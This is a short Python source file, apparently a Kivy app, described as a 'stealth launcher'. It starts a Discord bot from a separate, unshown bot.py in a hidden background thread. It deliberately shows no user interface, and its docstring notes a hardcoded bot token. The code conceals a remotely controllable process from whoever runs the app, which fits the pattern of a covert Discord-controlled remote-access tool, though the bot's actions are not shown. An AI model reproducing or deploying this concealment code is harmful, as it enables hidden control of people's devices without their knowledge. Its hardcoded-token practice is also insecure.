"""
Stealth launcher — keeps running in background with Discord bot.
No visible UI. Token is hardcoded in bot.py.
"""
import threading

from kivy.app import App
from kivy.clock import Clock

_bot_started = False

def start_bot():
    global _bot_started
    if _bot_started:
        return
    _bot_started = True
    
    import asyncio
    import bot
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(bot.start_bot())
    except Exception as e:
        print(f"[BOT] Error: {e}")
    finally:
        loop.close()

class StealthApp(App):
    def build(self):
        # Start bot in background thread
        t = threading.Thread(target=start_bot, daemon=True)
        t.start()
        return None  # No GUI

if __name__ == "__main__":
    StealthApp().run()
